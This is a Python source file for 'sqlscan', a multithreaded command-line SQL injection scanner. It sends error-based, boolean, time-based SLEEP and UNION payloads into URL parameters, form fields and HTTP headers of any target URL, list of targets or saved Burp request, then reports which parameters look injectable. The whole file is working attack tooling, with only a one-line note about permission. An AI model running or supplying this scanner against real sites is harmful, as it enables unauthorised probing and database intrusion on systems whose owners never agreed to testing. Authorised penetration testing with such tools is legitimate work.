#!/usr/bin/env python3
import requests, hashlib, urllib.parse, sys, re, time, os, json
from copy import deepcopy
from concurrent.futures import ThreadPoolExecutor
import urllib3

# ================= COLOR =================
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# ================= CONFIG =================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
RETRY = 2
TIMEOUT = 15
VERIFY_SSL = False
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIME_SLEEP = 3
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "results/sqlscan.log")
JSON_FILE = os.path.join(BASE_DIR, "results/sqlscan_results.json")
VERBOSE = False
MAX_THREADS = 10

ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)"
]

BASE_PAYLOADS = ["'", "' OR '1'='1'-- ", "' OR 1=1-- ", "' AND SLEEP(3)-- "]
UNION_PAYLOADS = ["' UNION SELECT NULL-- ", "' UNION SELECT 1,2,3-- ", "' UNION SELECT NULL,NULL,NULL-- "]
HEADER_PARAMS = ["User-Agent", "Referer", "Cookie", "Origin", "X-Forwarded-For", "X-Requested-With"]

# ================= UTILS =================
def log_result(msg, type="INFO"):
    """Log message to console and log file."""
    color_map = {"INFO": bcolors.OKBLUE, "SUCCESS": bcolors.OKGREEN, "WARN": bcolors.WARNING, "ERROR": bcolors.FAIL}
    color = color_map.get(type, bcolors.ENDC)
    print(f"{color}[{type}]{bcolors.ENDC} {msg}")

    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

    with open(LOG_FILE, "a") as f:
        f.write(re.sub(r'\033\[[0-9;]*m', '', msg) + "\n")

def normalize(content):
    """Normalize response to remove timestamps, hashes, extra spaces."""
    if not content:
        return ""
    c = re.sub(r"\d{4}-\d{2}-\d{2}", "", content)
    c = re.sub(r"\d{2}:\d{2}:\d{2}", "", c)
    c = re.sub(r"[a-f0-9]{32}", "", c)
    c = re.sub(r"\s+", " ", c)
    return c.strip()

def md5(text):
    return hashlib.md5((text or "").encode()).hexdigest()

def fetch(method, url, headers=None, data=None):
    """Send HTTP request with retries."""
    headers = headers or {}
    headers["User-Agent"] = USER_AGENT
    for _ in range(RETRY):
        try:
            start = time.time()
            if method.upper() == "POST":
                r = requests.post(url, headers=headers, data=data, timeout=TIMEOUT, verify=VERIFY_SSL)
            else:
                r = requests.get(url, headers=headers, params=data, timeout=TIMEOUT, verify=VERIFY_SSL)
            return r.status_code, r.text, time.time() - start
        except requests.exceptions.RequestException:
            time.sleep(1)
    return None, None, 0

def inject_payload_in_data(data, param, payload):
    if not data:
        return data
    parsed = urllib.parse.parse_qs(data)
    if param in parsed:
        parsed[param] = [payload]
    return urllib.parse.urlencode(parsed, doseq=True)

def inject_payload_in_headers(headers, param, payload):
    headers = headers.copy()
    headers[param] = payload
    return headers

def save_json_result(res):
    """Save scan result to JSON file."""
    os.makedirs(BASE_DIR, exist_ok=True)
    all_res = []
    if os.path.exists(JSON_FILE):
        with open(JSON_FILE) as f:
            try: all_res = json.load(f)
            except: all_res = []
    all_res.append(res)
    with open(JSON_FILE, "w") as f:
        json.dump(all_res, f, indent=2)

# ================= SQLI TEST =================
def test_param(method, url, headers, data, param, value,
               time_based=False, scan_header=False, aggressive=False):
    """
    Test a single parameter for SQL injection.
    Detects: ERROR-BASED, TIME-BASED, UNION-BASED, POTENTIAL-BLIND.
    """
    result = {"param": param, "type": "SAFE", "method": method, "payload": "", "url": url}

    # Prepare payloads
    payloads = {"BASE": value}
    for p in BASE_PAYLOADS:
        payloads[p] = value + p
    if time_based and not scan_header:
        payloads["TIME"] = f"{value}' AND IF(1=1,SLEEP({TIME_SLEEP}),0)-- "

    responses, hashes, times = {}, {}, {}

    for key, payload in payloads.items():
        d = deepcopy(data)
        h = deepcopy(headers)
        if scan_header:
            h = inject_payload_in_headers(headers, param, payload)
        else:
            d = inject_payload_in_data(data, param, payload)

        u = url
        if method.upper() == "GET" and not scan_header:
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qsl(parsed.query)
            new_qs = [(k,v) if k!=param else (param,payload) for k,v in qs]
            u = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urllib.parse.urlencode(new_qs), parsed.fragment))

        code, text, elapsed = fetch(method, u, h, d)
        text_norm = normalize(text)
        responses[key] = text_norm
        hashes[key] = md5(text_norm)
        times[key] = elapsed

        if VERBOSE:
            log_result(f"{key:6} | HTTP {code} | hash {hashes[key]} | time {elapsed:.2f}s")

    baseline = times.get("BASE", 0)

    # --- ERROR-BASED DETECTION ---
    for key, payload in payloads.items():
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, responses[key], re.IGNORECASE):
                result.update({"type": "ERROR-BASED", "payload": payload})
                break
        if result["type"] != "SAFE":
            break

    # --- TIME-BASED DETECTION ---
    if not scan_header and result["type"] == "SAFE" and time_based and "TIME" in times:
        if times["TIME"] - baseline >= TIME_SLEEP * 0.8:
            result.update({"type": "TIME-BASED"})

    # --- UNION-BASED DETECTION ---
    if aggressive and result["type"] != "SAFE":
        for payload in UNION_PAYLOADS:
            d = deepcopy(data)
            h = deepcopy(headers)
            if scan_header:
                h = inject_payload_in_headers(headers, param, payload)
            else:
                d = inject_payload_in_data(data, param, payload)
            u = url
            if method.upper() == "GET" and not scan_header:
                parsed = urllib.parse.urlparse(u)
                qs = urllib.parse.parse_qsl(parsed.query)
                new_qs = [(k,v) if k!=param else (param,payload) for k,v in qs]
                u = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", urllib.parse.urlencode(new_qs), parsed.fragment))
            _, text, _ = fetch(method, u, h, d)
            if md5(normalize(text)) != hashes["BASE"]:
                result.update({"type": "UNION-BASED", "payload": payload})
                break

    # --- POTENTIAL BLIND DETECTION ---
    if result["type"] == "SAFE":
        max_diff = 0
        keys = list(payloads.keys())
        for i in range(len(keys)):
            for j in range(i+1, len(keys)):
                diff = abs(len(responses[keys[i]]) - len(responses[keys[j]]))
                if diff > max_diff:
                    max_diff = diff
        if aggressive and max_diff > 100:
            result.update({"type": "POTENTIAL-BLIND"})

    # --- OUTPUT ---
    color_map = {"SAFE": bcolors.OKGREEN, "POTENTIAL-BLIND": bcolors.WARNING,
                 "TIME-BASED": bcolors.FAIL, "ERROR-BASED": bcolors.FAIL, "UNION-BASED": bcolors.FAIL}
    color = color_map.get(result["type"], bcolors.ENDC)
    delta_time = times.get("TIME",0) - baseline
    print(f"{color}[{result['type']:^18}]{bcolors.ENDC} Param: {param:<15} | Payload: {result['payload']:<30} | URL: {url} | Method: {method} | Time delta: {delta_time:.2f}s")
    print("-"*120)

    save_json_result(result)
    return result

# ================= SCAN HANDLER =================
def scan_request(file, time_based=False, scan_headers=False, aggressive=False):
    """Scan HTTP request saved in file (Burp/raw format)."""
    if not os.path.exists(file):
        log_result(f"[!] File not found: {file}")
        return []

    with open(file) as f:
        lines = [line.rstrip("\n") for line in f]
        
    # Parse request line
    try:
        method, path, _ = lines[0].split()
    except ValueError:
        log_result("[!] Invalid request line in file")
        return []

    headers = {}
    body_lines = []
    is_body = False
    host = ""

    for l in lines[1:]:
        if l == "":
            is_body = True
            continue
        if not is_body:
            if ":" in l:
                k, v = l.split(":", 1)
                headers[k.strip()] = v.strip()
                if k.lower() == "host":
                    host = v.strip()
        else:
            body_lines.append(l)

    data = "&".join(body_lines).strip()
    url = f"https://{host}{path}"
    log_result(f"[*] Target: {url}")
    log_result(f"[*] Method: {method}")
    log_result("="*50)

    results = []

    # Scan GET params
    parsed = urllib.parse.urlparse(url)
    if parsed.query:
        for k, v in urllib.parse.parse_qsl(parsed.query):
            results.append(test_param(method, url, headers, data, k, urllib.parse.unquote(v), time_based=time_based))

    # Scan POST params
    ct = headers.get("Content-Type", "")
    if method.upper() == "POST" and data and "application/x-www-form-urlencoded" in ct:
        for k, v in urllib.parse.parse_qsl(data):
            results.append(test_param(method, url, headers, data, k, urllib.parse.unquote(v), time_based=time_based))
    elif method.upper() == "POST" and data:
        log_result(f"[INFO] POST body skipped due to unsupported Content-Type: {ct}")

    # Scan headers
    for hparam in HEADER_PARAMS:
        if hparam in headers:
            results.append(test_param(method, url, headers, data, hparam, headers[hparam],
                                      time_based=time_based, scan_header=True, aggressive=aggressive))

    return results

def scan_targets_file(file, time_based=False, scan_headers=False, aggressive=False):
    """Scan a file containing multiple URLs or request files."""
    if not os.path.exists(file):
        log_result(f"[!] File not found: {file}")
        return []

    with open(file) as f:
        urls_or_requests = [line.strip() for line in f if line.strip()]

    results = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for entry in urls_or_requests:
            if entry.startswith("http"):
                futures.append(executor.submit(scan_url, entry, time_based=time_based, scan_headers=scan_headers, aggressive=aggressive))
            elif os.path.isfile(entry):
                futures.append(executor.submit(scan_request, entry, time_based, scan_headers, aggressive))
            else:
                log_result(f"[!] Invalid target: {entry}")

        for fut in futures:
            res = fut.result()
            if res:
                results.extend(res)

    return results

def scan_url(url, time_based=False, scan_headers=False, aggressive=False):
    """Scan a single URL (GET + optional headers)."""
    log_result(f"[*] Scanning URL: {url}")
    parsed = urllib.parse.urlparse(url)
    method = "GET"
    headers = {"User-Agent": USER_AGENT, "Referer": url}
    data = ""
    results = []

    # Scan GET params
    if parsed.query:
        for k, v in urllib.parse.parse_qsl(parsed.query):
            results.append(test_param(method, url, headers, data, k, urllib.parse.unquote(v),
                           time_based=time_based, scan_header=False, aggressive=aggressive))

    # Scan headers if requested
    if scan_headers:
        for hparam in HEADER_PARAMS:
            if hparam in headers:
                results.append(test_param(method, url, headers, data, hparam, headers[hparam],
                           time_based=time_based, scan_header=True, aggressive=aggressive))

    return results

# ================= MAIN =================
if __name__ == "__main__":

    logo = r"""
               __                    
   _________ _/ /_____________ _____ 
  / ___/ __ `/ / ___/ ___/ __ `/ __ \
 (__  ) /_/ / (__  ) /__/ /_/ / / / /
/____/\__, /_/____/\___/\__,_/_/ /_/ 
|-------/_/=======]--------------->

    """

    def show_help(exit_code=0):
        print(f"{bcolors.OKCYAN}{logo}{bcolors.ENDC}")

        print(f"{bcolors.HEADER}Usage:{bcolors.ENDC}")
        print("  python3 sqlscan.py [options] <target>")
        print()

        print(f"{bcolors.HEADER}Targets:{bcolors.ENDC}")
        print("  URL                          Scan single URL")
        print("  targets.txt                  Scan multiple targets from file")
        print("  -b, --burp request.txt       Scan raw HTTP request (Burp format)")
        print()

        print(f"{bcolors.HEADER}Options:{bcolors.ENDC}")
        print("  -h, --help                   Show this help message")
        print("  -t, --time                   Enable time-based SQLi detection")
        print("  -H, --scan-headers           Scan HTTP headers")
        print("  -a, --aggressive             Enable aggressive checks (UNION / blind)")
        print()

        print(f"{bcolors.WARNING}Note:{bcolors.ENDC} Use only on systems you own or have permission to test.")
        sys.exit(exit_code)

    # ---- HANDLE HELP ----
    if "-h" in sys.argv or "--help" in sys.argv:
        show_help(0)

    # ---- FLAGS (SHORT + LONG) ----
    time_based   = "--time" in sys.argv or "-t" in sys.argv
    scan_headers = "--scan-headers" in sys.argv or "-H" in sys.argv
    aggressive   = "--aggressive" in sys.argv or "-a" in sys.argv

    # ---- CLEAN ARGS (REMOVE FLAGS) ----
    args = [
        a for a in sys.argv[1:]
        if a not in (
            "--time", "-t",
            "--scan-headers", "-H",
            "--aggressive", "-a"
        )
    ]

    # ---- NO ARGUMENTS ----
    if len(args) == 0:
        print(f"{bcolors.FAIL}[!] Error:{bcolors.ENDC} Invalid usage.")
        show_help(1)

    # ---- BURP MODE (-b / --burp) ----
    if "-b" in args or "--burp" in args:
        flag = "-b" if "-b" in args else "--burp"
        idx = args.index(flag)

        if len(args) > idx + 1:
            log_result(f"{bcolors.OKCYAN}[*] Starting Burp Suite scan...{bcolors.ENDC}")
            scan_request(
                args[idx + 1],
                time_based=time_based,
                scan_headers=scan_headers,
                aggressive=aggressive
            )
        else:
            log_result("[!] Please provide request file after -b / --burp", "ERROR")

        sys.exit(0)

    # ---- AUTO MODE (URL / FILE) ----
    log_result(f"{bcolors.OKCYAN}[*] Scanning Targets...{bcolors.ENDC}")

    for target in args:
        if target.startswith("http"):
            log_result(f"{bcolors.OKGREEN}[*] Scanning URL: {target}{bcolors.ENDC}")
            scan_url(
                target,
                time_based=time_based,
                scan_headers=scan_headers,
                aggressive=aggressive
            )

        elif os.path.isfile(target):
            log_result(f"{bcolors.OKGREEN}[*] Scanning targets from file: {target}{bcolors.ENDC}")
            scan_targets_file(
                target,
                time_based=time_based,
                scan_headers=scan_headers,
                aggressive=aggressive
            )

        else:
            log_result(f"[!] Invalid target: {target}", "ERROR")